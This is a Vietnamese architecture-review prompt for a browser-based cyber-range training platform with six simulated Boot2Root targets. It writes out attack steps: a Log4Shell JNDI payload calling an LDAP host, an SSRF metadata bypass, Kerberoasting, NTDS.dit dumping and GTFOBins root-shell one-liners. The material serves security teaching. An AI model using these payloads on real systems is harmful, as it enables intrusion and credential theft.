# TÀI LIỆU YÊU CẦU ĐÁNH GIÁ KIẾN TRÚC: HỆ THỐNG PHÒNG THÍ NGHIỆM AN TOÀN THÔNG TIN ẢO (VIRTUAL CYBER RANGE & BOOT2ROOT LABS)

> **Mục đích**: Tài liệu đặc tả kỹ thuật và bài toán thiết kế dành riêng để gửi cho ChatGPT / Claude / Chuyên gia An toàn Thông tin độc lập thực hiện Review, Phản biện và Góp ý kiến trúc.
> **Tính chất học thuật & Pháp lý**: Đây là dự án **Phần mềm Giáo dục & Đào tạo Phòng thủ An toàn Thông tin (Educational Cyber Range & Defensive Security Academy)**, vận hành $100\%$ bằng máy ảo mô phỏng cục bộ trong trình duyệt (In-Browser Virtual POSIX Engine / WebAssembly), tương tự các nền tảng _PortSwigger Web Security Academy_, _OverTheWire_, _HackTheBox Academy_ và _TryHackMe_. Mọi máy chủ, IP và tệp tin đều là dữ liệu mô phỏng trong bộ nhớ RAM, phục vụ mục đích nghiên cứu và giáo dục an ninh mạng có ủy quyền.

---

```
╔══════════════════════════════════════════════════════════════════════════════════════════════════╗
║ BẠN CÓ THỂ COPY TOÀN BỘ PHẦN DƯỚI ĐÂY VÀ PASTE TRỰC TIẾP VÀO CHATGPT ĐỂ NHẬN REVIEW PHẢN BIỆN   ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════╝
```

---

### PROMPT GỬI CHATGPT REVIEW:

```text
Xin chào ChatGPT, tôi đang phát triển một nền tảng Web học tập và rèn luyện kỹ năng An toàn Thông tin Thực chiến (Cyber Range & Offensive Security Academy) được xây dựng trên nền tảng Next.js (App Router), React 19, TypeScript và TailwindCSS.

Mục tiêu của hệ thống là cung cấp môi trường phòng thí nghiệm mô phỏng máy ảo chạy hoàn toàn trên trình duyệt (Client-side in-memory Linux POSIX Virtual File System), cho phép sinh viên và kỹ sư an toàn thông tin rèn luyện tư duy thực tế theo chu trình Boot2Root (Trinh sát -> Khai thác lỗ hổng ban đầu lấy User Shell -> Khảo sát nội bộ -> Leo quyền lên Root qua GTFOBins).

Dưới đây là bản thiết kế kiến trúc toàn diện của hệ thống. Nhờ bạn đóng vai trò là Senior Security Architect & Lead Fullstack Engineer để REVIEW, PHẢN BIỆN và ĐÁNH GIÁ các khía cạnh:
1. Tính xác thực kỹ thuật (Technical Authenticity) của các vector leo quyền (PrivEsc).
2. Thiết kế công thái học UI/UX và xử lý bài toán Layout IDE phức tạp.
3. Độ bền vững của bộ máy ảo POSIX VFS & Lớp phân quyền UNIX DAC.
4. Những lỗ hổng thiết kế tiềm ẩn (Edge Cases) hoặc rủi ro mà đội ngũ phát triển cần lưu ý.

--------------------------------------------------------------------------------
DƯỚI ĐÂY LÀ ĐẶC TẢ KIẾN TRÚC CHI TIẾT:
--------------------------------------------------------------------------------

### I. KIẾN TRÚC LÕI HỆ THỐNG (CORE ENGINES)

1. Virtual POSIX File System (VFS Engine - 1800+ lines TypeScript):
   - Cấu trúc Inode ảo: VfsNode = { type: 'file'|'dir', mode: number (vd 0o755, 0o600), owner: string, group: string, content: string, size: number }.
   - UNIX Discretionary Access Control (DAC Engine):
     * Hàm checkPermission(node, user, access: 'read'|'write'|'exec') kiểm tra bit số học theo chuẩn POSIX.
     * Quy tắc Root Bypass: User UID = 0 (root) luôn có quyền đọc/ghi mọi tệp tin.
     * Quy tắc Chặn User thường: User UID = 1000 (operator) hoặc UID = 33 (www-data) khi truy cập các tệp thuộc sở hữu root (mode 0o600 như /root/root.txt hoặc /etc/shadow) sẽ bị ném lỗi 'Permission denied' (ExitCode 1).
   - Shell Parser & Command Dispatcher:
     * Hỗ trợ 40+ lệnh: ls, cd, cat, grep, find, sudo, su, chmod, chown, id, whoami, python3, base64, nmap, curl.
     * Hỗ trợ Pipe ('|'), Redirection ('>', '>>'), và Chaining ('&&', ';').
     * Lệnh sudo: Đọc cấu hình từ /etc/sudoers (ví dụ: 'operator ALL=(ALL) NOPASSWD: /usr/bin/find') và thực thi subcommand với context UID = 0 (root).
     * Lệnh find: Hỗ trợ flag '-perm -4000' (tìm SUID) và '-exec <command> \;' (GTFOBins escape).

2. Đồng Bộ Trạng Thái Tác Chiến Đa Công Cụ (Multi-Tool Sync):
   - HTTP Repeater (Burp-like RFC 7230 request/response) và Terminal kết nối qua Zustand State Store.
   - Khi người học gửi đúng Exploit Request trên Repeater -> Hệ thống kích hoạt Event 'foothold_achieved' -> Terminal tự động kết nối phiên Reverse Shell (www-data@target:/var/www/html$).

---

### II. THIẾT KẾ 6 CỖ MÁY MỤC TIÊU THỰC CHIẾN (BOOT2ROOT TARGET BOXES)

Mỗi bài lab là một máy chủ hoàn chỉnh với 2 mốc cắm cờ (Dual-Flag):

1. Box 1: CITRIX-GATEWAY (10.0.4.10:443) - FreeBSD/NetScaler Appliance
   - Giai đoạn 1 (Foothold): Khai thác CVE-2023-4966 (Citrix Bleed) gửi header Authorization quá dài (>64 bytes) làm tràn heap OpenID -> Bóc tách Session Cookie admin -> Replay vào diagnostic endpoint lấy shell 'operator'. Bắt User Flag (/home/operator/user.txt).
   - Giai đoạn 2 (PrivEsc): Khảo sát 'sudo -l' thấy 'NOPASSWD: /usr/bin/find' -> Khai thác GTFOBins 'sudo find . -exec /bin/bash \;' -> Nâng quyền lên ROOT (UID 0). Bắt Root Flag (/root/root.txt).
   - Giai đoạn 3 (Pivot): Trích xuất LDAP Bind Password trong /flash/nsconfig/ns.conf để pivot sang Domain Controller.

2. Box 2: LOG4-BANKING (10.0.4.20:8080) - Enterprise Banking API
   - Giai đoạn 1 (Foothold): Gửi chuỗi JNDI LDAP '${jndi:ldap://10.0.4.15:1389/Exploit}' vào Header User-Agent của Apache Tomcat 9.0.50 -> Kích hoạt RCE spawn shell 'operator'. Bắt User Flag.
   - Giai đoạn 2 (PrivEsc): Đọc /etc/crontab phát hiện cron job chạy ngầm bởi root: '/usr/bin/python3 /opt/backup/cleanup.py' (file này có quyền ghi 0777) -> Chèn mã độc Python tạo SUID bash -> Leo lên ROOT (UID 0). Bắt Root Flag.
   - Giai đoạn 3 (Pivot): Đọc config database trong /var/banking/db.properties trích xuất credential để pivot sang cụm Database 10.0.4.50.

3. Box 3: CLOUD-IMDS-NODE (10.0.4.35:443) - AWS Hybrid Gateway
   - Giai đoạn 1 (Foothold): Bypass SSRF filter chặn '169.254.169.254' bằng Decimal IP '2852039166' -> Lấy IMDSv2 Token -> Trích xuất SSH Key từ User Data -> SSH lấy shell 'operator'. Bắt User Flag.
   - Giai đoạn 2 (PrivEsc): 'sudo -l' phát hiện 'NOPASSWD: /usr/bin/vim /etc/nginx/*' -> Khai thác GTFOBins 'sudo vim -c ":!/bin/bash"' -> Leo lên ROOT (UID 0). Bắt Root Flag.
   - Giai đoạn 3 (Pivot): Sử dụng AWS IAM Role trích xuất file terraform.tfstate trên S3 chứa private keys của toàn bộ hạ tầng EC2.

4. Box 4: CORP-DC01 (172.16.1.5:88) - Active Directory Domain Controller
   - Giai đoạn 1 (Foothold): Quét SPN lấy vé Kerberos TGS bằng 'impacket-GetUserSPNs' -> Crack hash offline với John/Rockyou -> Đăng nhập MSSQL lấy shell 'operator'. Bắt User Flag.
   - Giai đoạn 2 (PrivEsc): Quét SUID 'find / -perm -4000' phát hiện binary SUID '/usr/bin/python3' -> GTFOBins 'python3 -c "import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")"' -> Leo lên ROOT (UID 0). Bắt Root Flag.
   - Giai đoạn 3 (Pivot): Dùng secretsdump.py trích xuất toàn bộ NTDS.dit và NTLM hash của Domain Administrator.

5. Box 5: FINTECH-PROTO (10.0.4.45:3000) - Node.js Microservice
   - Giai đoạn 1 (Foothold): Khai thác Prototype Pollution trong JSON merge gán '__proto__.shell' -> Kích hoạt child_process.fork() spawn shell 'operator'. Bắt User Flag.
   - Giai đoạn 2 (PrivEsc): 'sudo -l' phát hiện 'NOPASSWD: /usr/bin/awk' -> GTFOBins 'sudo awk "BEGIN {system(\"/bin/bash\")}"' -> Leo lên ROOT (UID 0). Bắt Root Flag.

6. Box 6: RACE-SETTLEMENT (10.0.4.50:443) - Concurrency Settlement Vault
   - Giai đoạn 1 (Foothold): Gửi burst HTTP/2 đồng thời 10 request rút tiền (TOCTOU) để số dư vượt âm -> Upload report executable wrapper -> Lấy shell 'operator'. Bắt User Flag.
   - Giai đoạn 2 (PrivEsc): 'sudo -l' phát hiện 'NOPASSWD: /usr/bin/apt' -> GTFOBins 'sudo apt update -o APT::Update::Pre-Invoke::="/bin/bash"' -> Leo lên ROOT (UID 0). Bắt Root Flag.

---

### III. THIẾT KẾ GIAO DIỆN & CÔNG THÁI HỌC (UI/UX CYBER-DECK)

1. Giải phóng Không gian Làm việc (Full-Width Canvas):
   - Khi người dùng vào phân hệ Arena (/offensive-security/arena), Sidebar điều hướng toàn trang (280px) tự động thu gọn thành thanh Icon Rail mỏng (60px) có nút toggle mở/đóng.
   - Chiều rộng không gian làm việc đạt 1400px - 1800px trên màn hình desktop.

2. Bố cục 3 Phân vùng (3-Zone Ergonomics):
   - Top Combat HUD Bar (52px): Cố định hiển thị Target Box IP:Port, Trạng thái máy (Scanned / Foothold / Root Pwned), Wallet ($ Bounty) và Ô Nộp Cờ Nhanh (Quick Flag Submit).
   - Left Mission Drawer (320px): Chứa Briefing nhiệm vụ, Mục tiêu cắm cờ (User Flag & Root Flag checklist), Bậc thang gợi ý (Hint Ladder 4 cấp có trừ điểm thưởng). Có thể thu gọn (Minimize) để nhường 100% diện tích cho Terminal.
   - Main Operator Toolset Stage: Chứa HTTP Repeater (hỗ trợ chuyển đổi Side-by-Side vs Stacked) và Dual-Terminal chia tab, hỗ trợ đổi màu Prompt động theo cấp độ quyền (Xanh: Attacker -> Vàng: User -> Đỏ: Root).

--------------------------------------------------------------------------------
CÂU HỎI DÀNH CHO BẠN (CHATGPT):
--------------------------------------------------------------------------------
1. Bạn đánh giá thế nào về tính thực chiến và độ logic sư phạm của 6 kịch bản Boot2Root trên? Có vector leo quyền nào bị bất hợp lý hoặc quá khiên cưỡng không?
2. Bộ máy UNIX DAC (checkPermission) và Sudo Engine mô phỏng bằng TypeScript như trên đã đủ an toàn và chặt chẽ để ngăn chặn người học "gian lận" hoặc đọc trộm file root trước khi leo quyền chưa? Cần bổ sung thêm cơ chế kiểm tra nào không?
3. Bạn có đề xuất gì thêm về mặt UI/UX để giúp học viên không bị choáng ngợp (cognitive overload) khi phải thao tác cùng lúc giữa HTTP Repeater, Terminal và Sơ đồ mạng không?
4. Đưa ra checklist các rủi ro kỹ thuật (Technical Risks & Edge Cases) mà tôi cần kiểm thử trước khi bàn giao bản hoàn chỉnh.
```
